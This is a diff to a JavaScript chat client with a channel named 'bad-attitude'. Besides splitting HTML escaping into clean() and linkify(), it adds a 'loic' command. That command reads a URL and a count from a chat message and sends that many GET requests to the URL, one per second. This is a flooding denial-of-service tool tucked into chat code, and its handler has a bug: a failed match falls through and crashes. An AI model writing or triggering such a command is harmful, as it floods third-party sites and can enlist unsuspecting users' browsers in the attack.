@@ -82,7 +82,10 @@ var channel = 'bad-attitude';
 
 function clean(text) {
   var i = 0, m;
-  text = text.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
+  return text.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
+}
+
+function linkify(text) {
   while((m = /\b(https?:\/\/\S+)/.exec(text.substring(i)))) {
     var ins = '<a href="' + encodeURI(m[1]) + '">' + m[1] + '</a>';
     text = text.substring(0, i + m.index) + ins +
@@ -349,6 +352,23 @@ var commands = {
       .catch(function(error) {
         console.log("encrypt/send error: " + error);
       });
+  },
+
+  loic: function(obj) {
+    var command = obj.message.match(/^\/loic\s+(\S+)\s+(\d+)/);
+    if (!command) {
+      console.log("loic: no match to ["+ obj.message +"]");
+    }
+    var url = command[1];
+    var count = command[2];
+    for (var i=0; i<count; ++i) {
+      setTimeout(function() {
+        var xhr = new XMLHttpRequest();
+        xhr.open("GET", url, true);
+        xhr.send();
+      }, i*1000);
+    }
+    return "<i>Sending "+ count +" GET requests to "+ url +"</i>";
   }
 };
 
@@ -407,6 +427,8 @@ PUBNUB.subscribe({
           return;
         }
       }
+
+      display = linkify(display);
 
       // By default, "nick: message"
       if (!display) {
